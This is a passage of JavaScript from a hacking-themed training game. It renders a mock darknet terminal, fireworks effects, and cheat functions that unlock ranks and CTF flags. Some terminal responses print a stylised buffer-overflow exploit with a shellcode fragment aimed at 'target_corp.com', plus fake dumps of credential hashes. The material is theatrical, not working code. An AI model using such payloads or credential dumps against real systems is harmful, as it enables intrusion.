                <div style="color: #facc15; font-weight: 800; margin-bottom: 4px;">🛒 UNDERGROUND ZERO-DAY EXPLOIT BROKER (ESCROW SECURED)</div>
                <table class="darknet-market-table">
                    <thead>
                        <tr>
                            <th>ITEM</th>
                            <th>VULNERABILITY / ASSET</th>
                            <th>PRICE</th>
                            <th>SELLER</th>
                            <th>STATUS</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>${tableRows}</tbody>
                </table>
                <div style="color: #64748b; font-size: 0.65rem;">Tip: Type 'market buy 0D-01' to simulate transaction and extract weaponized exploit POC.</div>
            `;
        } else if (cmd.startsWith('market buy')) {
            const parts = cmd.split(' ');
            const itemId = (parts[2] || '0D-01').toUpperCase();
            playVictorySfx();
            resp.innerHTML = `
                <div style="background: rgba(0, 255, 102, 0.08); border: 1px solid #00ff66; padding: 10px; margin-top: 4px;">
                    <div style="color: #00ff66; font-weight: 800;">[✓] TRANSACTION CONFIRMED ON MONERO BLOCKCHAIN (TX: 0x8a9f...c24e)</div>
                    <div style="color: #f1f5f9; margin-top: 4px;">Acquired Exploit Package: <b>${itemId}</b></div>
                    <div style="color: #38bdf8; font-family: monospace; font-size: 0.7rem; margin-top: 6px; background: #000; padding: 6px; border: 1px dashed #334155;">
                        # EXPLOIT POC FOR ${itemId}<br/>
                        # Target: Pre-Auth Memory Overflow Buffer<br/>
                        PAYLOAD = b"\\x41" * 1024 + b"\\x90\\x90\\x90\\x90" + b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"<br/>
                        sock = ssl.wrap_socket(socket.socket())<br/>
                        sock.connect(('target_corp.com', 443))<br/>
                        sock.send(b"POST /remote/login HTTP/1.1\\r\\nContent-Length: " + str(len(PAYLOAD)).encode() + b"\\r\\n\\r\\n" + PAYLOAD)<br/>
                        print("[+] ROOT SHELL SPAWNED ON REMOTE HOST")
                    </div>
                </div>
            `;
        } else if (cmd === 'neofetch') {
            resp.innerHTML = `
                <div style="display: flex; gap: 16px; align-items: center; color: #00ff66; font-family: monospace; font-size: 0.72rem;">
                    <pre style="color: #4ade80; font-size: 0.7rem; line-height: 1.15; margin: 0;">
      ,---.
     /     \\
    | () () |
     \\  ^  /
      |||||
     (     )
    (       )
     \`-----\`
 [TOR ONION]
                    </pre>
                    <div style="line-height: 1.45;">
                        <div><b style="color: #facc15;">onion@pwnbox-airgap</b></div>
                        <div style="color: #64748b;">---------------------</div>
                        <div><b>OS:</b> Tails Hardened GNU/Linux x86_64</div>
                        <div><b>Kernel:</b> 6.8.0-pwnbox-c2-hardened</div>
                        <div><b>Onion Host:</b> pwnbox7x9k2v6m3q8h.onion</div>
                        <div><b>Uptime:</b> 412 days, 14 hours, 28 mins</div>
                        <div><b>Tor Protocol:</b> v3 Hidden Service (ED25519)</div>
                        <div><b>Memory:</b> 412 MB / 32768 MB (RAM Disk)</div>
                        <div><b>Cipher:</b> ChaCha20-Poly1305 & Kyber-1024 Quantum</div>
                    </div>
                </div>
            `;
        } else if (cmd === 'irc' || cmd === 'chat') {
            const ircFeed = DARKNET_IRC_MESSAGES.map(m => `
                <div class="darknet-chat-row">
                    <span class="darknet-chat-time">[${new Date().toTimeString().split(' ')[0]}]</span>
                    <span class="darknet-chat-user">&lt;${m.user}&gt;</span>
                    <span style="color: #e2e8f0;">${m.text}</span>
                </div>
            `).join('');

            resp.innerHTML = `
                <div style="color: #38bdf8; font-weight: 800; margin-bottom: 6px;">💬 CLANDESTINE CHATROOM: #darknet-underground (ENCRYPTED)</div>
                <div style="background: #000; border: 1px solid #1e293b; padding: 10px; font-size: 0.7rem;">
                    ${ircFeed}
                </div>
                <div style="color: #64748b; font-size: 0.65rem; margin-top: 4px;">Type 'irc send &lt;your message&gt;' to broadcast an anonymous message.</div>
            `;
        } else if (cmd.startsWith('irc send ')) {
            const userMsg = cmdStr.substring(9).trim();
            playKeyClick();
            resp.innerHTML = `
                <div style="background: #000; border: 1px solid #1e293b; padding: 10px; font-size: 0.7rem;">
                    <div class="darknet-chat-row">
                        <span class="darknet-chat-time">[${new Date().toTimeString().split(' ')[0]}]</span>
                        <span style="color: #facc15; font-weight: 800;">&lt;you_anon&gt;</span>
                        <span style="color: #ffffff;">${escapeHtml(userMsg)}</span>
                    </div>
                    <div class="darknet-chat-row" style="margin-top: 6px;">
                        <span class="darknet-chat-time">[${new Date().toTimeString().split(' ')[0]}]</span>
                        <span class="darknet-chat-user">&lt;shadow_broker&gt;</span>
                        <span style="color: #e2e8f0;">Affirmative. Message received on relayed onion channel. Stand by for payload verification.</span>
                    </div>
                </div>
            `;
        } else if (cmd.startsWith('crack')) {
            const parts = cmd.split(' ');
            const hash = parts[1] || '5d41402abc4b2a76b9719d911017c592';
            playTone(850, 'square', 0.1);
            resp.innerHTML = `
                <div style="color: #facc15;">[+] Initializing GPU Rainbow Table scan on hash: <b>${escapeHtml(hash)}</b>...</div>
                <div style="color: #64748b; font-size: 0.68rem;">Scanning 14.2 Billion entries from rockyou_2026.txt...</div>
                <div style="color: #00ff66; font-weight: 800; margin-top: 6px; border: 1px solid #00ff66; padding: 8px;">
                    [✓] COLLISION FOUND IN 0.384 SECONDS!<br/>
                    ALGORITHM: MD5 / NTLM<br/>
                    PLAINTEXT PASSWORD: <span style="background: #00ff66; color: #000; padding: 1px 4px; font-weight: 900;">hello_pwnbox_operative</span>
                </div>
            `;
        } else if (cmd === 'leaks') {
            resp.innerHTML = `
                <div style="color: #ef4444; font-weight: 800; margin-bottom: 4px;">🗂️ INTERCEPTED CORPORATE CREDENTIAL DUMPS:</div>
                <div style="font-size: 0.68rem; color: #cbd5e1; background: #000; padding: 8px; border: 1px solid #334155; line-height: 1.5;">
                    <div>[DUMP 01] corp.defense-contractor.internal | Admin: <b>aad3b435b51404eeaad3b435b51404ee:e19ccf750c7254571e77f21f71ce8716</b></div>
                    <div>[DUMP 02] global-banking-vpn.ch | user: cfo_finance | Pass: <b>$2a$12$e8k...9PqW (Bcrypt)</b></div>
                    <div>[DUMP 03] cloud-telecom-aws-iam | AccessKey: <b>[DEMO-AKIA-REDACTED-KEY]</b> | Secret: <b>[DEMO-AWS-SECRET-REDACTED-KEY]</b></div>
                </div>
            `;
        } else if (cmd === 'circuits') {
            resp.innerHTML = `
                <div style="color: #00ff66; font-weight: 800;">🌐 CURRENT MULTI-HOP ONION CIRCUIT TELEMETRY:</div>
                <div style="font-size: 0.7rem; color: #cbd5e1; line-height: 1.5; margin-top: 4px;">
                    <div>[HOP 1 - ENTRY] 185.220.101.5 (DE) | Bandwidth: 1.2 Gbps | Fingerprint: 4E9C...11A0</div>
                    <div>[HOP 2 - RELAY] 193.106.191.7 (IS) | Bandwidth: 850 Mbps | Fingerprint: 98BF...CC32</div>
                    <div>[HOP 3 - EXIT]  91.240.118.2 (NL)  | Bandwidth: 2.4 Gbps | Fingerprint: F710...88B1</div>
                    <div style="color: #4ade80; margin-top: 4px;">Full circuit is encrypted with 3 layers of AES-256 onion wrapping.</div>
                </div>
            `;
        } else if (cmd === 'pgp') {
            resp.innerHTML = `
                <div style="color: #facc15; font-family: monospace; font-size: 0.68rem; line-height: 1.25;">
                    -----BEGIN PGP PUBLIC KEY BLOCK-----<br/>
                    Version: PwnBox Sovereign Architecture v3.4.0<br/><br/>
                    mQENBF+q7vEBCADL38G1v4nFpX/0qL9eXQ1pP5d...<br/>
                    ...[ARCHITECT SIGNATURE: PRANAV PUSHYA]...<br/>
                    ...KEY ID: 0x9F4C2A1E8D77B034...<br/>
                    -----END PGP PUBLIC KEY BLOCK-----
                </div>
            `;
        } else if (cmd === 'decrypt') {
            playVictorySfx();
            resp.innerHTML = `
                <div style="color: #00ff66; border: 2px solid #00ff66; padding: 12px; background: rgba(0, 255, 102, 0.1);">
                    <div style="font-weight: 900; font-size: 0.85rem;">[✓] QUANTUM CIPHER DECRYPTION COMPLETE!</div>
                    <div style="margin-top: 6px; font-size: 0.78rem;">
                        FLAG: <span style="background: #00ff66; color: #000; font-weight: 900; padding: 2px 6px;">PWNBOX{ARCHITECT_PRANAV_ROOT_ACCESS}</span>
                    </div>
                    <div style="font-size: 0.68rem; color: #86efac; margin-top: 6px;">
                        Access Level: TOP SECRET // SPECIAL ACCESS PROGRAM APPROVED.
                    </div>
                </div>
            `;
        } else if (cmd === 'clear') {
            out.innerHTML = '';
            return;
        } else {
            resp.innerHTML = `<span style="color: #ef4444;">Command not found: '${escapeHtml(cmdStr)}'. Type 'help' to inspect available darknet commands.</span>`;
        }

        out.appendChild(resp);
        out.scrollTop = out.scrollHeight;
    }

    window.runDarknetShortcut = runDarknetShortcut;
    window.handleDarknetKey = handleDarknetKey;
    window.executeDarknetCmd = executeDarknetCmd;
    window.initDarknetTerminal = initDarknetTerminal;

    // ========================================================
    // --- THREE.JS WEBGL 3D CELEBRATION FIREWORKS ENGINE ---
    // ========================================================
    const celebration3D = {
        renderer: null,
        scene: null,
        camera: null,
        animId: null,
        canvas: null,
        particlesMesh: null,
        maxParticles: 1600,
        positions: null,
        colors: null,
        velocities: [],
        lifespans: [],
        autoLaunchTimer: null,
        isRunning: false,
        currentPalette: 'gold',
        gravity: 0.0035
    };

    function playGodModeFanfare() {
        try {
            const ctx = getAudioContext();
            if (!ctx) return;
            const notes = [
                { f: 261.63, t: 0.00, d: 0.12 }, // C4
                { f: 329.63, t: 0.08, d: 0.12 }, // E4
                { f: 392.00, t: 0.16, d: 0.12 }, // G4
                { f: 523.25, t: 0.24, d: 0.15 }, // C5
                { f: 659.25, t: 0.34, d: 0.15 }, // E5
                { f: 783.99, t: 0.44, d: 0.18 }, // G5
                { f: 1046.50, t: 0.56, d: 0.65 } // C6
            ];
            const now = ctx.currentTime;
            notes.forEach(n => {
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(n.f, now + n.t);
                gain.gain.setValueAtTime(0.001, now + n.t);
                gain.gain.linearRampToValueAtTime(0.12, now + n.t + 0.02);
                gain.gain.exponentialRampToValueAtTime(0.0001, now + n.t + n.d);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start(now + n.t);
                osc.stop(now + n.t + n.d + 0.05);
            });
        } catch (e) {}
    }

    function startGodModeCelebration3D() {
        if (typeof THREE === 'undefined') return;

        let canvas = document.getElementById('threeGodmodeCelebrationCanvas');
        if (!canvas) return;
        canvas.style.display = 'block';
        celebration3D.canvas = canvas;

        if (!celebration3D.renderer) {
            const width = window.innerWidth;
            const height = window.innerHeight;

            const scene = new THREE.Scene();
            const camera = new THREE.PerspectiveCamera(60, width / height, 0.1, 1000);
            camera.position.set(0, 0, 20);

            const renderer = new THREE.WebGLRenderer({
                canvas: canvas,
                alpha: true,
                antialias: true,
                powerPreference: 'high-performance'
            });
            renderer.setSize(width, height);
            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

            // Fireworks Particle System
            const pCount = celebration3D.maxParticles;
            const positions = new Float32Array(pCount * 3);
            const colors = new Float32Array(pCount * 3);
            const velocities = [];
            const lifespans = [];

            for (let i = 0; i < pCount; i++) {
                positions[i * 3] = 0;
                positions[i * 3 + 1] = -999;
                positions[i * 3 + 2] = 0;

                colors[i * 3] = 1.0;
                colors[i * 3 + 1] = 0.9;
                colors[i * 3 + 2] = 0.0;

                velocities.push({ x: 0, y: 0, z: 0 });
                lifespans.push(0);
            }

            const pGeo = new THREE.BufferGeometry();
            pGeo.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            pGeo.setAttribute('color', new THREE.BufferAttribute(colors, 3));

            const pMat = new THREE.PointsMaterial({
                size: 0.35,
                vertexColors: true,
                transparent: true,
                opacity: 0.95,
                blending: THREE.AdditiveBlending
            });

            const particlesMesh = new THREE.Points(pGeo, pMat);
            scene.add(particlesMesh);

            celebration3D.scene = scene;
            celebration3D.camera = camera;
            celebration3D.renderer = renderer;
            celebration3D.particlesMesh = particlesMesh;
            celebration3D.positions = positions;
            celebration3D.colors = colors;
            celebration3D.velocities = velocities;
            celebration3D.lifespans = lifespans;

            window.addEventListener('resize', onCelebrationResize);
        }

        celebration3D.isRunning = true;
        animateCelebration3D();

        // Trigger initial celebration fireworks barrage
        trigger3DCelebrationFireworks();

        // Occasional celebratory fireworks in background
        clearInterval(celebration3D.autoLaunchTimer);
        celebration3D.autoLaunchTimer = setInterval(() => {
            if (celebration3D.isRunning) {
                const rx = (Math.random() - 0.5) * 14;
                const ry = 1 + Math.random() * 5;
                const rz = (Math.random() - 0.5) * 6;
                const palettes = ['gold', 'cyan', 'magenta', 'emerald'];
                spawnFireworkBurst(rx, ry, rz, 200, palettes[Math.floor(Math.random() * palettes.length)]);
            }
        }, 2800);
    }

    function onCelebrationResize() {
        if (!celebration3D.renderer || !celebration3D.camera) return;
        const w = window.innerWidth;
        const h = window.innerHeight;
        celebration3D.camera.aspect = w / h;
        celebration3D.camera.updateProjectionMatrix();
        celebration3D.renderer.setSize(w, h);
    }

    function trigger3DCelebrationFireworks(customPal) {
        if (!celebration3D.isRunning) {
            startGodModeCelebration3D();
        }
        playTone(880, 'triangle', 0.12, 0.1);
        const pal = customPal || celebration3D.currentPalette || 'gold';

        if (pal === 'all') {
            spawnFireworkBurst(0, 4, 0, 400, 'gold');
            setTimeout(() => spawnFireworkBurst(-6, 3, -2, 350, 'cyan'), 150);
            setTimeout(() => spawnFireworkBurst(6, 3.5, -2, 350, 'magenta'), 300);
            setTimeout(() => spawnFireworkBurst(0, 7, -3, 300, 'emerald'), 500);
        } else {
            spawnFireworkBurst(0, 4, 0, 400, pal);
            setTimeout(() => spawnFireworkBurst(-6, 3, -2, 350, pal), 150);
            setTimeout(() => spawnFireworkBurst(6, 3.5, -2, 350, pal), 300);
            setTimeout(() => spawnFireworkBurst(0, 7, -3, 300, pal), 500);
        }
    }

    function spawnFireworkBurst(ox, oy, oz, count, palette) {
        if (!celebration3D.positions || !celebration3D.velocities) return;
        const pCount = celebration3D.maxParticles;
        let spawned = 0;

        if (palette === 'all') {
            const pals = ['gold', 'cyan', 'magenta', 'emerald'];
            palette = pals[Math.floor(Math.random() * pals.length)];
        }

        const paletteColors = {
            gold: [[1.0, 0.88, 0.1], [1.0, 0.65, 0.0], [1.0, 1.0, 0.7]],
            cyan: [[0.0, 0.94, 1.0], [0.2, 0.7, 1.0], [0.8, 1.0, 1.0]],
            magenta: [[0.85, 0.2, 0.9], [1.0, 0.1, 0.5], [1.0, 0.7, 0.9]],
            emerald: [[0.1, 0.95, 0.5], [0.3, 1.0, 0.7], [0.8, 1.0, 0.9]]
        }[palette] || [[1.0, 0.9, 0.1], [0.0, 0.94, 1.0]];

        for (let i = 0; i < pCount && spawned < count; i++) {
            if (celebration3D.lifespans[i] <= 0) {
                celebration3D.positions[i * 3] = ox;
                celebration3D.positions[i * 3 + 1] = oy;
                celebration3D.positions[i * 3 + 2] = oz;

                const theta = Math.random() * Math.PI * 2;
                const phi = Math.acos(Math.random() * 2 - 1);
                const speed = 0.12 + Math.random() * 0.38;

                celebration3D.velocities[i] = {
                    x: Math.sin(phi) * Math.cos(theta) * speed,
                    y: Math.sin(phi) * Math.sin(theta) * speed + (Math.random() * 0.04),
                    z: Math.cos(phi) * speed
                };

                const col = paletteColors[Math.floor(Math.random() * paletteColors.length)];
                celebration3D.colors[i * 3] = col[0];
                celebration3D.colors[i * 3 + 1] = col[1];
                celebration3D.colors[i * 3 + 2] = col[2];

                celebration3D.lifespans[i] = 65 + Math.random() * 55;
                spawned++;
            }
        }
    }

    function animateCelebration3D() {
        if (!celebration3D.isRunning) return;
        celebration3D.animId = requestAnimationFrame(animateCelebration3D);

        if (celebration3D.particlesMesh && celebration3D.positions) {
            const pCount = celebration3D.maxParticles;
            const pos = celebration3D.positions;
            const vel = celebration3D.velocities;
            const life = celebration3D.lifespans;
            const grav = celebration3D.gravity || 0.0035;

            for (let i = 0; i < pCount; i++) {
                if (life[i] > 0) {
                    pos[i * 3] += vel[i].x;
                    pos[i * 3 + 1] += vel[i].y;
                    pos[i * 3 + 2] += vel[i].z;

                    vel[i].x *= 0.982;
                    vel[i].y *= 0.982;
                    vel[i].y -= grav; // Configurable physics gravity
                    vel[i].z *= 0.982;

                    life[i]--;
                } else {
                    pos[i * 3] = 0;
                    pos[i * 3 + 1] = -999;
                    pos[i * 3 + 2] = 0;
                }
            }
            celebration3D.particlesMesh.geometry.attributes.position.needsUpdate = true;
        }

        celebration3D.renderer.render(celebration3D.scene, celebration3D.camera);
    }

    function stopGodModeCelebration3D() {
        celebration3D.isRunning = false;
        clearInterval(celebration3D.autoLaunchTimer);
        if (celebration3D.animId) {
            cancelAnimationFrame(celebration3D.animId);
            celebration3D.animId = null;
        }
        if (celebration3D.canvas) {
            celebration3D.canvas.style.display = 'none';
        }
    }

    // ========================================================
    // --- SECRET GATEWAY 3: ARCHITECT GODMODE & WARGAMES ARCADE -
    // ========================================================
    let ambientSynthOsc1 = null;
    let ambientSynthOsc2 = null;
    let ambientGain = null;
    let isAmbientPlaying = false;

    function openGodModeModal() {
        const modal = document.getElementById('architectGodModeModal');
        if (!modal) return;

        // Auto-grant Root Architect VIP status and Zero-Day permissions
        localStorage.setItem('pwnbox_godmode_badge', 'true');
        localStorage.setItem('pwnbox_m08_unlocked', 'true');
        localStorage.setItem('pwnbox_zero_day_bypass', 'true');
        localStorage.setItem('userRank', 'ROOT ARCHITECT');
        localStorage.setItem('pwnbox_agent_rank', 'ROOT ARCHITECT');

        // Update persistent HUD indicator
        updateGodModeHUD();

        // Update XP display
        const xpEl = document.getElementById('godmodeXpDisplay');
        if (xpEl) {
            const cur = localStorage.getItem('pwnbox_user_xp') || localStorage.getItem('userXP') || '2450';
            xpEl.textContent = parseInt(cur, 10).toLocaleString() + ' XP';
        }

        modal.style.setProperty('display', 'flex', 'important');
        playGodModeFanfare();
        switchGodModeTab('godmode');

        // Launch Three.js 3D WebGL Celebration Fireworks!
        startGodModeCelebration3D();
    }

    function closeGodModeModal() {
        const modal = document.getElementById('architectGodModeModal');
        if (modal) modal.style.setProperty('display', 'none', 'important');
        stopGodModeCelebration3D();
        playClickSound();
    }

    function switchGodModeTab(tab) {
        const tabs = ['godmode', 'arcade', 'arsenal'];
        tabs.forEach(t => {
            const btn = document.getElementById('tabBtn' + t.charAt(0).toUpperCase() + t.slice(1));
            const pane = document.getElementById(t + 'Tab');
            if (btn) btn.classList.toggle('active', t === tab);
            if (pane) {
                if (t === tab) {
                    pane.style.display = (t === 'godmode' || t === 'arsenal') ? 'flex' : 'block';
                } else {
                    pane.style.display = 'none';
                }
            }
        });
        playClickSound();
    }

    function boostGodmodeXP() {
        let cur = parseInt(localStorage.getItem('pwnbox_user_xp') || localStorage.getItem('userXP') || '2450', 10);
        cur += 10000;
        localStorage.setItem('pwnbox_user_xp', cur.toString());
        localStorage.setItem('userXP', cur.toString());

        const xpEl = document.getElementById('godmodeXpDisplay');
        if (xpEl) {
            xpEl.textContent = cur.toLocaleString() + ' XP (OVERCLOCKED ⚡)';
            xpEl.style.color = '#ffe600';
        }

        playVictorySfx();
        trigger3DCelebrationFireworks();

        if (window.showCustomAlert) {
            window.showCustomAlert(
                "⚡ +10,000 XP INJECTED!",
                `Operative telemetry overclocked. Total XP is now ${cur.toLocaleString()}!`,
                "success"
            );
        }
    }

    function copyArsenalPayload(text, btnEl) {
        try {
            navigator.clipboard.writeText(text);
            playKeyClick();
            if (btnEl) {
                const orig = btnEl.textContent;
                btnEl.textContent = '✓ COPIED!';
                btnEl.style.color = '#10b981';
                setTimeout(() => {
                    btnEl.textContent = orig;
                    btnEl.style.color = '';
                }, 2000);
            }
        } catch (e) {
            playTone(400, 'sine', 0.1);
        }
    }

    function applySecretTheme(themeName) {
        playTone(980, 'triangle', 0.12, 0.1);
        document.documentElement.setAttribute('data-theme', themeName);
        localStorage.setItem('theme', themeName);

        if (window.showCustomAlert) {
            window.showCustomAlert(
                "VIP THEME ACTIVATED!",
                `Applied Secret Theme: ${themeName.toUpperCase()}. Enjoy your customized cyber environment!`,
                "success"
            );
        }
    }

    function updateGodModeHUD() {
        let hud = document.getElementById('godmodeFloatingHud');
        const isActive = localStorage.getItem('pwnbox_godmode_badge') === 'true';
        const rank = localStorage.getItem('userRank') || localStorage.getItem('pwnbox_agent_rank') || 'ROOT ARCHITECT';
        const aura = localStorage.getItem('pwnbox_aura_glow') || 'gold';
        const auraColors = {
            gold: '#ffe600',
            cyan: '#00f0ff',
            rainbow: '#d946ef',
            matrix: '#10b981'
        };
        const col = auraColors[aura] || '#ffe600';

        if (isActive) {
            if (!hud) {
                hud = document.createElement('div');
                hud.id = 'godmodeFloatingHud';
                hud.className = 'godmode-hud-indicator';
                hud.title = "Click to configure Architect VIP GodMode & Audio";
                hud.addEventListener('click', () => {
                    if (typeof openGodModeModal === 'function') openGodModeModal();
                });
                document.body.appendChild(hud);
            }
            hud.innerHTML = `
                <span class="godmode-pulse-dot" style="background: ${col}; box-shadow: 0 0 10px ${col};"></span>
                <span>👑 ${rank} // GODMODE ACTIVE</span>
            `;
            hud.style.borderColor = col;
            hud.style.boxShadow = `0 0 15px ${col}44`;
            hud.style.display = 'flex';
        } else {
            if (hud) hud.style.display = 'none';
        }
    }

    // --- UNIQUE ARCHITECT X-RAY SIGHT SCANNER ---
    let isXrayActive = false;

    function toggleArchitectXRay() {
        isXrayActive = !isXrayActive;
        const btn = document.getElementById('btnToggleXray');
        let overlay = document.getElementById('pwnboxXrayOverlay');

        if (!isXrayActive) {
            if (overlay) overlay.remove();
            document.querySelectorAll('.pwnbox-xray-highlight').forEach(el => el.classList.remove('pwnbox-xray-highlight'));
            document.querySelectorAll('.pwnbox-xray-badge').forEach(el => el.remove());
            if (btn) {
                btn.innerHTML = '👁️ ENGAGE X-RAY SCANNER';
                btn.style.background = '#00f0ff';
                btn.style.color = '#000';
            }
            playTone(300, 'sawtooth', 0.15, 0.1);
            return;
        }

        if (!overlay) {
            overlay = document.createElement('div');
            overlay.id = 'pwnboxXrayOverlay';
            overlay.innerHTML = `
                <div class="pwnbox-xray-banner">
                    <span class="xray-dot"></span>
                    <span>ARCHITECT X-RAY SIGHT: ACTIVE</span>
                    <span style="color: #ffe600;">[5 SECRET GATEWAYS REVEALED]</span>
                    <button onclick="toggleArchitectXRay()" style="background: none; border: 1px solid #00f0ff; color: #00f0ff; padding: 2px 10px; cursor: pointer; font-family: 'Space Mono', monospace; font-size: 0.7rem; font-weight: 800; border-radius: 3px;">DISENGAGE</button>
                </div>
            `;
            document.body.appendChild(overlay);
        }

        if (btn) {
            btn.innerHTML = '✓ X-RAY SCANNER ONLINE (DISENGAGE)';
            btn.style.background = '#10b981';
            btn.style.color = '#fff';
        }

        playTone(1200, 'sine', 0.25, 0.15);
        setTimeout(() => playTone(1800, 'sine', 0.15, 0.1), 120);

        highlightSecretGateways();
    }

    function highlightSecretGateways() {
        // Gateway 2: Footer Version
        const g2 = document.getElementById('footerVersionTrigger');
        if (g2) {
            g2.classList.add('pwnbox-xray-highlight');
            attachXrayBadge(g2, 'GATEWAY 2: AIRGAP PINPAD VAULT (PIN: 1337 / 0000 / CLICK 7x)');
        }

        // Gateway 4: Quantum Core Canvas / 3D core
        const g4 = document.getElementById('quantumCoreCanvas') || document.querySelector('.quantum-core-container') || document.querySelector('.canvas-3d-wrapper');
        if (g4) {
            g4.classList.add('pwnbox-xray-highlight');
            attachXrayBadge(g4, 'GATEWAY 4: DECLASSIFIED ARCHIVE (TRIPLE-CLICK CORE)');
        }

        // Copilot button / AI Assistant
        const aiBtn = document.querySelector('.floating-copilot-btn') || document.getElementById('floatingAssistantBtn');
        if (aiBtn) {
            aiBtn.classList.add('pwnbox-xray-highlight');
            attachXrayBadge(aiBtn, 'AI COPILOT SHORTCUT (PRESS "A")');
        }

        // Dossier ID Card
        const dossier = document.querySelector('.agent-dossier-card') || document.getElementById('pranavStamp');
        if (dossier) {
            dossier.classList.add('pwnbox-xray-highlight');
            attachXrayBadge(dossier, 'CLASSIFIED ARCHITECT DOSSIER ID & BADGE');
        }
    }

    function attachXrayBadge(targetEl, text) {
        if (!targetEl || targetEl.querySelector('.pwnbox-xray-badge')) return;
        const badge = document.createElement('div');
        badge.className = 'pwnbox-xray-badge';
        badge.textContent = text;
        targetEl.appendChild(badge);
    }

    // --- UNIQUE MASTER ACADEMY CERTIFICATION ---
    function autoClearAllAcademyModules() {
        const modules = [
            'module_footprinting_completed',
            'module_scanning_completed',
            'module_enumeration_completed',
            'module_vuln_analysis_completed',
            'module_system_hacking_completed',
            'module_webapp_threats_completed',
            'module_osint_completed',
            'module_blackops_completed'
        ];
        modules.forEach(m => localStorage.setItem(m, 'true'));
        localStorage.setItem('pwnbox_m08_unlocked', 'true');
        localStorage.setItem('pwnbox_zero_day_bypass', 'true');
        localStorage.setItem('pwnbox_user_xp', '50000');
        localStorage.setItem('userXP', '50000');
        localStorage.setItem('userRank', 'ROOT ARCHITECT');
        localStorage.setItem('pwnbox_agent_rank', 'ROOT ARCHITECT');
        localStorage.setItem('pwnbox_godmode_badge', 'true');
        localStorage.setItem('pwnbox_certificate_unlocked', 'true');

        const xpEl = document.getElementById('godmodeXpDisplay');
        if (xpEl) {
            xpEl.textContent = '50,000 XP (ALL MODULES CLEARED 👑)';
            xpEl.style.color = '#ffe600';
        }

        updateGodModeHUD();
        playGodModeFanfare();
        trigger3DCelebrationFireworks('gold');
        openRootCertificateModal();
    }

    function openRootCertificateModal() {
        const modal = document.getElementById('architectCertificateModal');
        if (!modal) return;
        const nameEl = document.getElementById('certOperativeName');
        const hashEl = document.getElementById('certCryptoHash');
        const alias = localStorage.getItem('agentAlias') || localStorage.getItem('pwnbox_agent_alias') || localStorage.getItem('pwnbox_user_name') || 'PRANAV PUSHYA';
        if (nameEl) nameEl.textContent = alias.toUpperCase();
        if (hashEl) hashEl.textContent = 'SHA256: 0xPRANAV_' + Date.now().toString(16).toUpperCase() + '_OMEGA_ARCHITECT_GODMODE';

        modal.style.display = 'flex';
        playVictorySfx();
    }

    function closeRootCertificateModal() {
        const modal = document.getElementById('architectCertificateModal');
        if (modal) modal.style.display = 'none';
        playClickSound();
    }

    // --- UNIQUE CTF FLAG MASTER INJECTOR ---
    function injectMasterCtfFlags() {
        const flags = ['pwn_web_01', 'pwn_priv_02', 'pwn_osint_03', 'pwn_secret_godmode'];
        localStorage.setItem('pwnbox_ctf_solved_flags', JSON.stringify(flags));
        localStorage.setItem('pwnbox_arcade_total_xp', '15000');
        localStorage.setItem('pwnbox_arcade_xp', '15000');

        const btn = document.getElementById('btnCtfInject');
        if (btn) {
            btn.innerHTML = '<span>🏆</span> <span>ALL CTF FLAGS INJECTED (LEADERBOARD #1)</span>';
            btn.style.background = '#10b981';
            btn.style.color = '#fff';
        }

        playGodModeFanfare();
        trigger3DCelebrationFireworks('emerald');

        if (window.showCustomAlert) {
            window.showCustomAlert(
                "CTF SUPREMACY UNLOCKED!",
                "All operational flags injected into profile. Leaderboard position #1 claimed!",
                "success"
            );
        }
    }

    // --- UNIQUE OPERATIVE AURA & RANK CUSTOMIZER ---
    function updateAuraPillUI(selectedAura) {
        ['Gold', 'Cyan', 'Rainbow', 'Matrix'].forEach(a => {
            const lbl = document.getElementById('lblAura' + a);
            if (lbl) {
                lbl.classList.toggle('active', a.toLowerCase() === selectedAura.toLowerCase());
            }
        });
    }

    function applyCustomAuraAndRank() {
        const titleInput = document.getElementById('godmodeCustomTitleInput');
        const auraRadio = document.querySelector('input[name="godmodeAura"]:checked');
        const title = (titleInput && titleInput.value.trim()) ? titleInput.value.trim().toUpperCase() : 'ROOT ARCHITECT';
        const aura = auraRadio ? auraRadio.value : 'gold';

        localStorage.setItem('userRank', title);
        localStorage.setItem('pwnbox_agent_rank', title);
        localStorage.setItem('pwnbox_user_rank', title);
        localStorage.setItem('pwnbox_aura_glow', aura);
        localStorage.setItem('pwnbox_godmode_badge', 'true');

        updateGodModeHUD();
        playTone(980, 'triangle', 0.15, 0.1);
        trigger3DCelebrationFireworks(aura === 'matrix' ? 'emerald' : (aura === 'cyan' ? 'cyan' : (aura === 'rainbow' ? 'all' : 'gold')));

        if (window.showCustomAlert) {
            window.showCustomAlert(
                "AURA HUD ACTIVATED",
                `Operative Rank set to [${title}] with ${aura.toUpperCase()} Aura!`,
                "success"
            );
        }
    }

    // --- UNIQUE INTERACTIVE CYBER SYNTH SOUNDBOARD ---
    function playCyberPad(type, padEl) {
        if (padEl) {
            padEl.classList.add('pad-active');
            setTimeout(() => padEl.classList.remove('pad-active'), 220);
        }
        const ctx = getAudioContext();
        if (!ctx) return;
        const now = ctx.currentTime;

        try {
            if (type === 'subBass') {
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(75, now);
                osc.frequency.exponentialRampToValueAtTime(25, now + 0.55);
                gain.gain.setValueAtTime(0.25, now);
                gain.gain.exponentialRampToValueAtTime(0.001, now + 0.6);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start(now);
                osc.stop(now + 0.65);
            } else if (type === 'laserZap') {
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.type = 'sawtooth';
                osc.frequency.setValueAtTime(2200, now);
                osc.frequency.exponentialRampToValueAtTime(160, now + 0.18);
                gain.gain.setValueAtTime(0.18, now);
                gain.gain.exponentialRampToValueAtTime(0.001, now + 0.2);
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start(now);
                osc.stop(now + 0.22);
            } else if (type === 'empBurst') {
                const bufferSize = Math.floor(ctx.sampleRate * 0.4);
                const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
                const data = buffer.getChannelData(0);
